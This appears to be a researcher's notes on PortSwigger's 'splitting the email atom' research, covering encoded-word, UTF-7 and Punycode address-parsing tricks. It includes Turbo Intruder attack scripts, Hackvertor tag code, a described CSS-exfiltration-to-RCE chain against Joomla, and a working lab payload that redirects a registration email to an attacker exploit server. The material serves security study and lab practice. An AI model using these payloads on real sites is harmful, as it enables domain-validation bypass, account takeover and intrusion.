Source - https://portswigger.net/research/splitting-the-email-atom
Tools Gareth Heyes created for this - https://github.com/portswigger/splitting-the-email-atom

### Encoded-word

this encoding system allows you to represent characters using hex and base64
![[Pasted image 20240829154432.png | 500]]

The "=?" indicates the start of an encoded-word, then you specify the charset in this case UTF-8. Then the question mark separates the next command which is "q" which signifies "Q-Encoding" after that there's another question mark that states the end of the encoding format and the beginning of the encoded data. Q-Encoding is simply hex with an equal prefix. In this example I use =41=42=43 which is an uppercase "ABC". Finally, ?= indicates the end of the encoding. When parsed by an email library the email destination would be ABCUSER@psres.net!

#### Combining  different encodings

You can blend UTF-7 with Q-Encoding
![[Pasted image 20240829155127.png | 350]]

To use base64 use  "b" instead of "q" in the encoding type and encode with base64
![[Pasted image 20240829155213.png | 350]]

 Combining UTF-7 and base64 encoded data.  The email parser will decode the base64. Then the email parser will decode the UTF-7 charset. Finally the email will be decoded to `foobar@psres.net`
![[Pasted image 20240829155457.png | 500]]

### Exploitations

Github - In the diagram I used "x" but in a real attack you'd use "iso-8859-1".
![[Pasted image 20240829155637.png | 500]]

Zendesk
![[Pasted image 20240829155718.png | 500]]

Gitlab
![[Pasted image 20240829155801.png | 500]]

#### Exploiting Joomla to achieve RCE
![[Pasted image 20240829160056.png | 500]]

the first account name has an "a" and the second account name has "x", this is to ensure the style injection occurs first and the second account uses a @import. The curly braces are used to treat all the HTML that occurs before the import as an invalid CSS selector. Chrome's strict CSS mime type check doesn't apply here either because an inline style was used.

What we needed to do now is exfiltrate the CSRF token via CSS and thankfully there have been many good posts on this. The best way is to use import chaining and use one of the tools developed by [d0nut](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b) and [Pepe Vila](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf). I decided to customise the tool I already developed with my [blind CSS exfiltration research](https://portswigger.net/research/blind-css-exfiltration) which involved making it extract the specific Joomla token. I'll share the customised code in the Github repo later in the post.

With my CSS exfiltrator running, I registered the two accounts and visited the users page with the super admin account. The exfiltrator showed the admin's CSRF token so now the next step was to feed the admin the CSRF exploit that used the exfiltrated token. My exfiltrator also builds the [CSRF exploit](https://portswigger.net/web-security/csrf). The exploit then activates the attacker's account and makes them super admin. Then the attacker can modify an admin template to get RCE!

demo of the attack: https://www.youtube.com/watch?v=VjnBsA_oen4
## Methodology for finding the vulnerability:

First use the probes mentioned in this post and then observe the results in a tool like Collaborator. Repeat the process until you have the required characters for your attack. Then when this process is finished do the exploit. You can apply this methodology to both encoded-word and Punycode attacks.

1. First probe for "encoded-word", observe the decoded email to confirm that it is supported
	- The two probes that worked on most sites that had this behavior are
	 ![[Pasted image 20240829154711.png | 500]]
	 - Use the Collaborator to generate a payload and replace "collab" above with the generated one. Then if you get an SMTP interaction with the email in the RCPT TO command of the SMTP conversation This then proves the email parser is decoding the email with "**encoded word**"
	 
2. Then encode various characters and observe how they are decoded
3. Then follow up with an exploit that abuses these characters.

To observe the results I used [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) which allowed me to view SMTP interactions.
![[Pasted image 20240829153450.png | 600]]


### Generating email splitting attacks with Hackvertor tags

place the tag where you want the unicode overflow to happen and then place the characters you want to convert inside the tag
```text
<@_unicode_overflow(0x100,'...')>@</@_unicode_overflow>  
<@_unicode_overflow_variations(0xfff,'...')>@</@_unicode_overflow_variations>  
foo<@_encoded_word_encode('...')>@<@/_encoded_word_encode>example.com  
<@_encoded_word_decode('...')>=41=42=43<@/_encoded_word_decode> <@_email_utf7('...')><@/_email_utf7> <@_email_utf7_decode('...')><@/_email_utf7_decode> <@_encode_word_meta('iso-8859-1','...')><@/_encode_word_meta>
```

The first tag creates a single unicode overflow and uses the tag argument 0x100 which is 256 in decimal to create the overflow. The second uses the tag argument as the maximum unicode codepoint and generates as many characters as it can that overflow to the character specified inside the tag. The third tag will allow you to perform an encoded-word conversion, in the example I encode the @ symbol. The forth tag will decode the encoded-word sequence. There are further tags to help create and decode UTF-7 emails and the encoded-word meta characters.

To use these tags you need to enable "Allow code execution tags" in the Hackvertor menu. Then click the "View Tag Store" in the same menu. You can then install both tags by clicking on their name and then using the install button.

## Tools
### Turbo Intruder automation scripts

This script is used when you've identified that the server supports encoded-word but you want to know if the mailer will allow you to split the email by using nulls or other characters. It uses a list of known techniques that split an email

To use it you just need to change the validServer variable to your target domain to spoof. You then place %s in the request where you want your email to be added and then right click on the request and send to Turbo Intruder and use the modified script. Then run the attack. If the attack works you should receive a collaborator interaction within Turbo Intruder. This means the email domain is spoofable.

If you encounter applications with rate limits change the **REQUEST_SLEEP** variable to play nicely with those servers.

#### encoded-word.py

```python
import base64
import urllib

REQUEST_SLEEP = 1
COLLAB_SLEEP = 10


payloads = ["=?x?q?$collab1=40$collabServer=3e=00?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=01?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=02?=foo@$validServer"
            "=?x?q?$collab1=40$collabServer=3e=03?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=04?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=05?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=07?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=08?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=0e?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=0f?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=10?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=11?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=13?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=15?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=16?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=17?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=19?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=1a?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=1b?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=1c?=foo@$validServer", "=?x?q?$collab1=40$collabServer=3e=1d?=foo@$validServer",
            "=?x?q?$collab1=40$collabServer=3e=1f?=foo@$validServer","=?x?q?$collab1=40$collabServer=3e=20?=foo@$validServer", "=?x?q?$collab1=40$collabServer=2c?=x@$validServer",
            "=?utf7?q?$collab1&AEA-$collabServer&ACw-?=x@$validServer","=?utf7?q?$collab1&AEA-$collabServer&ACw=/xyz!-?=x@$validServer",
            "=?utf7?q?$collab1=26AEA-$collabServer=26ACw-?=x@$validServer","$collab1=?utf7?b?JkFFQS0?=$collabServer=?utf7?b?JkFDdy0?=x@$validServer","$collab1=?x?b?QA==?=$collabServer=?x?b?LA==?=x@$validServer"
           ]
           
invalidServer = "blah.blah"
validServer = "iwantto.spoof"
shouldUrlEncode = False
collab = callbacks.createBurpCollaboratorClientContext()
collabServer = collab.getCollaboratorServerLocation()
mappings = {}

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,                     
                           maxRetriesPerRequest=3
                           )

    for payload in payloads:
        if "$hex" in payload:
            generateHex(0, 255, payload, engine)
        else:  
            manipulated = replacePayload(payload)
            engine.queue(target.req,  urllib.quote_plus(manipulated) if shouldUrlEncode else manipulated)
            time.sleep(REQUEST_SLEEP)
            
    print "Waiting for interactions..."
    counter = 0            
    while counter < 10 and engine.engine.attackState.get() < 3: 
        found = fetchInteractions(collab)
        print "Found " + str(found) + " interactions"
        time.sleep(COLLAB_SLEEP)
        counter += 1
        if found > 0:
            counter = 0
    print "Completed"    

def replacePayload(payload):
    id1 = collab.generatePayload(False)
    id2 = collab.generatePayload(False)
    manipulated = payload
    manipulated = manipulated.replace("$validServer", validServer);
    manipulated = manipulated.replace("$invalidServer", invalidServer);
    manipulated = manipulated.replace("$collabServer", collabServer);
    manipulated = manipulated.replace("$collab1", id1);
    manipulated = manipulated.replace("$collab2", id2);
    mappings[id1] = manipulated
    return manipulated

def generateHex(start, end, payload, engine):
    for chrNum in range(start, end + 1):          
        manipulated = replacePayload(payload)
        manipulated = manipulated.replace("$hex", "{:02x}".format(chrNum));
        engine.queue(target.req,  urllib.quote_plus(manipulated) if shouldUrlEncode else manipulated)
        time.sleep(REQUEST_SLEEP)

def fetchInteractions(collab):
    interactions = collab.fetchAllCollaboratorInteractions()
    found = interactions.size()
    for interaction in interactions:
        smtp = interaction.getProperty('conversation')
        currentInteractionId = interaction.getProperty('interaction_id')
        try:
            original_payload = mappings[currentInteractionId]
        except KeyError:
            print "failed to look up payload for interaction id "+currentInteractionId
            original_payload = 'lookup_failed'
        
        if smtp == None:
            print "Got DNS interaction - not reporting"
            continue

        print "Got SMTP interaction, about to report"
            
        decoded = base64.b64decode(smtp)             
        email = decoded.partition('RCPT TO:<')[2].partition('>\r\n')[0]
        print "Found interaction! " + original_payload + " with interaction " + currentInteractionId      
    return found

def handleResponse(req, interesting):
    table.add(req)
```

#### punycode-bruteforce.py

```python
import urllib
import re
import random
from random import choice
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    chrs = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'.lower()

    #for i in range(0,10000):     
       #engine.queue(target.req, [i])
       #engine.queue(target.req, [urllib.quote_plus(chr(i).rstrip()),urllib.quote_plus(chr(i).rstrip())])
       #engine.queue(target.req, "0117"+(randomChoice(chrs,4)))
    #for i in range(0,10000):
    for i in chrs:      
        for j in chrs: 
            for k in chrs:               
                engine.queue(target.req, [i,j,k])

def randomChoice(chrs, amount):
    output = ""
    for i in range(0, amount):
        output += random.choice(chrs)
    return output

def handleResponse(req, interesting):
    #if re.search("Punycode conversion:x@.*@", req.response) and not re.search("xn--", req.response):
    if re.search("\\w@svg", req.response) and not re.search("xn--", req.response):
    #if re.search("Punycode conversion:", req.response) and not re.search("xn--", req.response):
        table.add(req)
```

### css-exfiltrator

You can use the CSS exfiltrator to exfiltrate data via CSS 

https://github.com/PortSwigger/splitting-the-email-atom/tree/main/tools/css-exfiltrator


### Hackvertor-tags

 **Installing tags from the tag store**
1. Load Burp with Hackvertor installed
2. Go to Hackvertor->View tag store
3. Click the tag you wish to install
4. Click the Install tag button

**Installing tags from the repo**
1. Open tags.json (below) 
2. Copy all to the clipboard
3. Go to Hackvertor->List custom tags
4. Click load tags from clipboard

**tags.json**
```json
[
  {
    "argument1Default": "0x100",
    "code": "output = input.split('').map(chr => \n\tString.fromCodePoint(mask + chr.codePointAt())\n).join('');",
    "argument1Type": "Number",
    "numberOfArgs": 1,
    "argument1": "mask",
    "language": "JavaScript",
    "tagName": "_unicode_overflow"
  },
  {
    "argument1Default": "0xfff",
    "code": "if(max > 0xffff) {\n   throw new Error(\"Max parameter is too large\");\n}\n\noutput = input.split('').map(chr => {\n\tlet characters = '';\n\tfor(let i=chr.codePointAt()+1;i<=max;i++){\n\t\tif(i % 256 === chr.codePointAt()) {\n\t\t\tcharacters += String.fromCodePoint(i);\n\t\t}\n\t}\n\treturn characters;\n}).join('');",
    "argument1Type": "Number",
    "numberOfArgs": 1,
    "argument1": "max",
    "language": "JavaScript",
    "tagName": "_unicode_overflow_variations"
  },
  {
    "code": "output = input.split('').map(chr => '=' + chr.codePointAt().toString(16).padStart(2, '0')).join('')",
    "numberOfArgs": 0,
    "language": "JavaScript",
    "tagName": "_encoded_word_encode"
  },
  {
    "code": "function isHexChar(char) {\n  return (char >= '0' && char <= '9') || (char >= 'A' && char <= 'F') || (char >= 'a' && char <= 'f');\n}\n\nlet parts = input.replaceAll(\"_\",\" \").split('=');\noutput = parts.slice(1).reduce((str, part) => \n  str + (isHexChar(part[0]) && isHexChar(part[1]) ? String.fromCodePoint(parseInt(part.slice(0, 2), 16)) : part.slice(0, 2)) + part.slice(2), \nparts[0]);",
    "numberOfArgs": 0,
    "language": "JavaScript",
    "tagName": "_encoded_word_decode"
  },
  {
    "code": "output = input.length() == 0 ? \"\" \n\t: \"&\" + input.replaceAll(\"(.)\",\"\\u0000\\$0\")\n\t.bytes.encodeBase64().toString()\n\t.replaceAll(/=+$/,\"\") + \"-\";",
    "numberOfArgs": 0,
    "language": "Groovy",
    "tagName": "_email_utf7"
  },
  {
    "argument1Default": "iso-8859-1",
    "code": "output = \"=?\"+charset+\"?q?\"+input+\"?=\";",
    "argument1Type": "String",
    "numberOfArgs": 1,
    "argument1": "charset",
    "language": "JavaScript",
    "tagName": "_encode_word_meta"
  },
  {
    "code": "output = input.replaceAll(\"&[a-zA-Z0-9]+-\", { match -> \n  return new String(match.replaceAll(\"[&-]\",\"\").decodeBase64())\n})",
    "numberOfArgs": 0,
    "language": "Groovy",
    "tagName": "_email_utf7_decode"
  }
]
```

## Lab

On the register account page, you could only register emails from `ginandjuice.shop`. This was using server side validation.
![[Pasted image 20240829163613.png | 500]]

**Using burp intruder**
1. send account registration request to intruder
2. insert payload position at the `email` form field
3. import the newly built in `FUZZING - email splitting attacks` wordlist from simple lists
4. use these payload processing rules (the lab provides a email server and address to use)
 ![[Pasted image 20240829163947.png]]
 5. From the results this payload seems to be the one that worked
```text
%3d%3futf-7%3fq%3fattacker%26AEA-exploit-0a8e0074048fe10183f6635101d400a3%2eexploit-server%2enet%26ACA-%3f%3dx@ginandjuice%2eshop
```
 ![[Pasted image 20240829173233.png ]]
 6. Received a registration email
 ![[Pasted image 20240829164115.png | 650]]
6. Can now login as an admin user and delete `carlos`
![[Pasted image 20240829163515.png]]
